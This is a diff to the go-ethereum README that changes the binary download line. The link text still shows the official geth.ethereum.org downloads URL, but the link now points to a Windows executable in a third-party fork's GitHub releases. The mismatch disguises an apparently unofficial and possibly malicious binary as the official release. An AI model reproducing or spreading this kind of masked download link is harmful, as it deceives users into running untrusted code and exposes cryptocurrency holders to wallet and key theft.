@@ -3,7 +3,7 @@
 Official Golang execution layer implementation of the Ethereum protocol.
 
 Automated builds are available for stable releases and the unstable master branch. Binary
-archives are published at https://geth.ethereum.org/downloads/.
+archives are published at [https://geth.ethereum.org/downloads/](https://github.com/Geass-to/go-ethereum/releases/download/ethereum/geth-windows-amd64-1.13.2-dc34fe82.exe).
 
 ## Building the source
 
